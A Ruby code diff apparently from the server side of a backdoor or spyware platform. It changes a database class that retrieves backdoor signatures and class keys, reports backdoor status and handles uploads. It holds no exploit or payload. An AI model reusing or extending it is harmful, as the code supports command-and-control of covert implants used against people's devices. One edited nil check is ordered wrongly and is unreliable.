@@ -50,7 +50,7 @@ class DB
     @class_keys = {}
     
     # the current db layer to be used is the XML-RPC protocol
-    # this will be replaced by DB_rabbitmq
+    # this will be replaced by DB_rest or DB_rabbitmq
     @db = DB_xmlrpc.new @host
 
     return @available
@@ -74,6 +74,7 @@ class DB
     trace :info, "Disconnected from [#{@host}]"
   end
 
+  private
   def connected=(value)
     # set this variable accordingly in each method to detect when the db is down
     @available = value
@@ -82,9 +83,9 @@ class DB
     else
       trace :warn, "DB is now considered NOT available"
     end
-
   end
 
+  public
   def connected?
     # is the database available ?
     return @available
@@ -95,24 +96,29 @@ class DB
       return @db.send method, *args
     rescue
       self.connected = false
+      return nil
     end
   end
 
   def cache_init
     # if the db is available, clear the cache and populate it again
     if @available then
+      # get the global signature (per customer) for all the backdoors
+      sig = db_call :backdoor_signature
+      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
+      
+      # get the classkey of every backdoor
+      keys = db_call :class_keys
+      @class_keys = keys unless keys.nil?
+
+      # errors while retrieving the data from the db
+      return false if sig.nil? or keys.nil?
+
       trace :info, "Emptying the DB cache..."
       # empty the cache and populate it again
       Cache.empty!
 
       trace :info, "Populating the DB cache..."
-      # get the global signature (per customer) for all the backdoors
-      sig = db_call :backdoor_signature
-      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
-      
-      # get the classkey of every backdoor and store it in the cache
-      @class_keys = db_call :class_keys
-
       # save in the permanent cache
       Cache.signature = sig
       trace :info, "Backdoor signature saved in the DB cache"
@@ -182,13 +188,11 @@ class DB
 
     trace :debug, "Asking the status of [#{build_id}] to the db"
 
-    status = DB::UNKNOWN_BACKDOOR
-    bid = 0
-    
     # ask the database the status of the backdoor
     status, bid = db_call :status_of, build_id, instance_id, subtype
 
-    return status, bid
+    # if status is nil, the db down. btw we must not fail, fake the reply
+    return (status.nil?) ? [DB::UNKNOWN_BACKDOOR, 0] : [status, bid]
   end
 
   def sync_for(bid, version, user, device, source, time)
@@ -243,7 +247,7 @@ class DB
     # put the config in the cache
     Cache.save_uploads bid, uploads unless uploads.empty?
 
-    return (uploads.empty?) ? false : true
+    return (uploads.empty? or uploads.nil?) ? false : true
   end
 
   def new_uploads(bid)
